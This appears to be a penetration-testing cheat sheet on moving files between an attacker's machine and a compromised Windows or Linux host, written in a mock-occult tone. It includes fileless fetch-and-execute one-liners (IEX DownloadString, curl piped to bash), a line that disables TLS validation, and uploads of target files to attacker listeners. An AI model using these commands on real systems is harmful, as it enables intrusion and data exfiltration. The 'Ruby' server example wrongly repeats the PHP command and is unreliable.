# 📁 File Transfers

In the profane rites of assessment, the movement of relics—scripts, payloads, and binaries—is both necessary and perilous. This chapter reveals methods for casting files across dimensions, utilizing primitive yet persistent protocols shared among ancient systems both Windows and Linux.

> *"No summoning may begin until the runes are in place."*

---

<details>
<summary><h1>🪟 Windows</h1></summary>
&nbsp;&nbsp;&nbsp;&nbsp;<details>  
<summary><h2>📥 Downloads</h2></summary>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>PowerShell Downloads</h3></summary>  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details> 
<summary><h4>PowerShell DownloadFile Method</h4></summary>

**Sync (Wait for the download to finish)**  

No password
```powershell
(New-Object Net.WebClient).DownloadFile('<FILE URL>','C:\Users\Public\<FILE>')
```
Using Credentials
```powershell
(New-Object Net.WebClient -Property @{Credentials = New-Object System.Net.NetworkCredential('<USER>', '<PASSWORD>')}).DownloadFile('<FILE URL>', 'C:\Users\Public\<FILE>')
```

**Async (Keep using Powershell while downloading)**  

No password
```powershell
(New-Object Net.WebClient).DownloadFileAsync('<FILE URL>','C:\Users\Public\<FILE>')
```
Using Credentials
```powershell
(New-Object Net.WebClient -Property @{Credentials = New-Object System.Net.NetworkCredential('<USER>', '<PASSWORD>')}).DownloadFileAsync('<FILE URL>', 'C:\Users\Public\<FILE>')
```

</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h4>PowerShell DownloadString - Fileless Method</h4></summary>

Default  
```powershell
IEX (New-Object Net.WebClient).DownloadString('<FILE URL>')
```

Pipeline input  
```powershell
(New-Object Net.WebClient).DownloadString('<FILE URL>') | IEX
```
</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h4>PowerShell Invoke-WebRequest</h4></summary>

Default  
```powershell
Invoke-WebRequest <FILE URL> -OutFile <OUTPUT FILE>
```

ByPass Internet Explorer Error  
```powershell
Invoke-WebRequest <FILE URL> -UseBasicParsing | IEX
```

ByPass SSL/TLS Error  
```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
</details>
</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>SMB Downloads</h3></summary>

**Prepare the server on Linux**

Create a temporary SMB Share and place your target file in it
```bash
mkdir /tmp/smbshare
cd /tmp/smbshare
mv <FILE> .
chmod 644 <FILE>
sudo impacket-smbserver share -smb2support .
```

**Download files on Windows**

**Option 1:** Download a single file
```cmd
copy \\<IP>\share\<FILE>
```

**Option 2:** Mount the share
```cmd
net use n: \\<IP>\share /persistent:no
```

**Using credentials**

Create the SMB Server in Linux
```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user <USER> -password <PASSWORD>
```
Mount the share
```cmd
net use n: \\<IP>\share /user:<USER> <PASSWORD>
```
Download the file
```cmd
copy n:\<FILE>
```
Umount the share
```cmd
net use n: /delete /y
```

</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>FTP Downloads</h3></summary>  

Setting up a Python3 FTP Server in Linux
```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21 --user ftpuser --password 'ftppass'
```

**Option 1: Download file using Powershell**
```powershell
(New-Object Net.WebClient -Property @{Credentials = New-Object System.Net.NetworkCredential('ftpuser', 'ftppass')}).DownloadFile('ftp://<IP>/<FILE>', 'C:\Users\Public\<FILE>')
```

**Option 2: Download file using CMD**  
```cmd
(
  echo open <IP>
  echo user ftpuser ftppass
  echo binary
  echo get <FILE>
  echo bye
) > ftpcommand.txt
ftp -i -v -n -s:ftpcommand.txt
```
---

</details>
</details>
&nbsp;&nbsp;&nbsp;&nbsp;<details>  
<summary><h2>📥 Uploads</h2></summary>  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>  
<summary><h3>PowerShell Uploads</h3></summary>  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>  
<summary><h4>PowerShell Base64 Encode & Decode</h4></summary>  

1. Encode File Using PowerShell 
```powershell
# 1. Convert File to Base64
[Convert]::ToBase64String((Get-Content -path "<FILE PATH>" -Encoding byte))

# 2. Computes the MD5 checksum of a file to verify its integrity.
Get-FileHash "<FILE PATH>" -Algorithm MD5 | select Hash
```
We copy this content and paste it into our attack host, use the base64 command to decode it, and use the md5sum application to confirm the transfer happened correctly.  

2. Decode Base64 String in Linux
```bash
# 1. Save the base64 string to a file
echo "<BASE64STRING>" > encoded.b64

# 2. Decode the base64 to recreate the original file
base64 -d encoded.b64 > decoded.txt

# 3. Verify the MD5 hash matches the Windows version
md5sum decoded.txt
```
</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>  
<summary><h4>PowerShell Web Uploads</h4></summary>  

1. Installing a Configured WebServer with Upload in Linux
```bash
pip3 install uploadserver
python3 -m uploadserver
```
2. PowerShell Script to Upload a File to Python Upload Server
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://<IP>:<PORT>/upload -File <FILE PATH>
```

</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>  
<summary><h4>PowerShell Base64 Web Upload</h4></summary>  

1. We use Netcat to listen in on a port we specify and send the file as a POST request.
```bash
nc -lvnp <PORT>
```
2. PowerShell Script to Upload a File to Python Upload Server
```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path '<FILE PATH>' -Encoding Byte))
Invoke-WebRequest -Uri http://<IP>:<PORT>/ -Method POST -Body $b64
```
3. We copy the output and use the base64 decode function to convert the base64 string into a file.
```bash
echo <BASE64 FILE> | base64 -d -w 0 > <FILE>
```
</details>
</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details> 
<summary><h3>SMB Uploads</h3></summary>  

1. Installing WebDav Python modules in Linux
```bash
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=<PORT> --root=/tmp --auth=anonymous
```
2. Uploading Files using SMB in Windows
```cmd
# DavWWWRoot is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server.
dir \\192.168.49.128\DavWWWRoot
copy <FILE PATH> \\<IP>\DavWWWRoot\

# You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \<IP>\sharefolder
copy <FILE PATH> \\<IP>\sharefolder\
```
If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.
</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details> 
<summary><h3>FTP Uploads</h3></summary>  

**1. Start our FTP Server in Linux**
```bash
sudo python3 -m pyftpdlib --port 21 --write
```
**2. Upload the file in Windows**

Option 1: Upload file using Powershell
```cmd
(New-Object Net.WebClient).UploadFile('ftp://<IP>/ftp-hosts', '<FILE PATH>')
```
Option 2: Create a Command File for the FTP Client to Upload a File
Create a Command File for the FTP Client and Download the Target File
```cmd
echo open <IP> > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT <FILE PATH> >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```
Once in FTP...
```cmd
USER anonymous
PUT <FILE PATH>
bye
```
</details>
</details>
</details>

---

<details>
<summary><h1>🐧 Linux</h1></summary>
&nbsp;&nbsp;&nbsp;&nbsp;<details>  
<summary><h2>📥 Downloads</h2></summary>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Base64 Encoding / Decoding</h3></summary>  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
  
**Check File MD5 hash**  
```bash
md5sum <FILE>
```

**Encode file to Base64**  
```bash
# We copy this content and paste it onto our Linux target machine
cat <FILE> |base64 -w 0;echo
```

**Decode the File**  
```bash
echo -n '<BASE64STRING>' | base64 -d > <OUTPUTFILE>
```

**Confirm the MD5 Hashes Match**  
```bash
md5sum <FILE>
```

</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Wget Downloads</h3></summary>  

**Basic Download**  
```bash
wget <FILE URL>
```

**Download with Custom Filename**  
```bash
wget -O <OUTPUT FILE> <FILE URL>
```

**Download with Authentication**  
```bash
wget --user=<USER> --password=<PASSWORD> <FILE URL>
```

**Fileless Download**  
```bash
# Executes it directly
wget -qO- <FILE URL> | python3
```

</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Curl Downloads</h3></summary>

**Basic Download**  
```bash
curl -O <FILE URL>
```

**Download with Custom Filename**  
```bash
curl -o <OUTPUT FILE> <FILE URL>
```

**Download with Authentication**  
```bash
curl -u <USER>:<PASSWORD> -O <FILE URL>
```

**Fileless Download**  
```bash
# Executes it directly
curl <FILE URL> | bash
```

</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Download with Bash</h3></summary>

**Connect to the Target Webserver**  
```bash
exec 3<>/dev/tcp/<IP>/<PORT>
```

**HTTP GET Request**  
```bash
echo -e "GET /<FILE> HTTP/1.1\n\n">&3
```

**Print the Response**  
```bash
cat <&3
```

</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>SSH Downloads</h3></summary>

**Enabling the SSH Server**  
```bash
sudo systemctl enable ssh
```

**Starting the SSH Server**  
```bash
sudo systemctl start ssh
```

**Checking for SSH Listening Port**  
```bash
netstat -lnpt
```

**Downloading Files Using SCP**  
```bash
scp <USER>@<IP>:<FILE PATH> . 
```

</details>
</details>
&nbsp;&nbsp;&nbsp;&nbsp;<details>  
<summary><h2>📥 Uploads</h2></summary>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Web Upload</h3></summary>

**Attacking machine: Start Web Server**  
```bash
sudo python3 -m pip install --user uploadserver
```

**Attacking machine: Create a Self-Signed Certificate**  
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

**Attacking machine: Prepare the files**  
```bash
mkdir https && cd https
mv ~/<FILE> .
```

> **_NOTE:_**  The webserver should not host the certificate. Create a new directory to host the file for the webserver.

**Attacking machine: Start Web Server**  
```bash
sudo python3 -m uploadserver --server-certificate ~/server.pem 443
```

**Targe machine: Download the file from the server**  
```bash
curl -k -O https://<IP>/upload/<FILE>
```

</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>SCP Uploads</h3></summary>  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details> 
<summary><h4>Basic SCP Upload</h4></summary>

**Upload to Remote Server**  
```bash
scp <LOCAL FILE> <USER>@<IP>:<REMOTE PATH>
```

**Upload with Custom Port**  
```bash
scp -P <PORT> <LOCAL FILE> <USER>@<IP>:<REMOTE PATH>
```

**Upload with Key Authentication**  
```bash
scp -i <KEY FILE> <LOCAL FILE> <USER>@<IP>:<REMOTE PATH>
```

</details>
</details>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>FTP Uploads</h3></summary>

**Using FTP Command**  
```bash
ftp <IP>
# Once connected:
put <LOCAL FILE>
```

**Using lftp**  
```bash
lftp -u <USER>,<PASSWORD> <IP>
# Once connected:
put <LOCAL FILE>
```

</details>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
<summary><h3>Alternative Web File Transfer Method</h3></summary>
A compromised Linux machine may not have a web server installed. In such cases, we can use a mini web server.

**Target machine: Creating a Web Server with Python3**  
```bash
python3 -m http.server
```

**Target machine: Creating a Web Server with Python2.7**  
```bash
python2.7 -m SimpleHTTPServer
```

**Target machine: Creating a Web Server with PHP**  
```bash
php -S 0.0.0.0:8000
```

**Target machine: Creating a Web Server with Ruby**  
```bash
php -S 0.0.0.0:8000
```

**Attacking machine: Download the File from the Target Machine**  
```bash
wget <IP>:8000/<FILE>
```

</details>
</details>
</details>

---

